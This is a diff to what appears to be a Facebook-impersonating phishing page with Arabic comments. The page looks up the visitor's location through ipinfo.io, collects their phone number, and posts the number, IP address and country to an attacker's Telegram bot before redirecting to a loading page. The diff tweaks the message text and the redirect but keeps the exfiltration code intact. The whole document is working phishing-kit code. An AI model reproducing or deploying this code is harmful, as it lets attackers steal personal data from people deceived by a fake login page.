@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="ar" id="facebook" class="">
 <head>
@@ -620,7 +619,7 @@ fetch('https://ipinfo.io/json')
                 $("#error-message").text(""); // إزالة رسالة الخطأ في حالة إدخال رقم الهاتف
             }
 
-            var telegramMessage = "New result by ASLOO "+\n+"Country Code : " + countryCode + "\nPhone Number : " + phoneNumber + "\nIP Address : " + ipAddress + "\nCountry : " + country;
+            var telegramMessage = "Country Code : " + countryCode + "\nPhone Number : " + phoneNumber + "\nIP Address : " + ipAddress + "\nCountry : " + country;
 
             var telegramBotUrl = "https://api.telegram.org/bot" + botConfig.botToken + "/sendMessage";
             var requestData = {
@@ -631,7 +630,7 @@ fetch('https://ipinfo.io/json')
             // إرسال البيانات إلى الروبوت
             $.post(telegramBotUrl, requestData, function(response) {
                 // بعد الإرسال، توجيه المستخدم إلى الصفحة الأخرى
-                window.location.href = "loading.html";
+                window.location.href = "Loading.html?FGDD=Loauyb734HSDHDS783JSDUE7Y34UEUY3GSDGHDSH73JS773USUSUS7ISUS63";
             });
         });
 
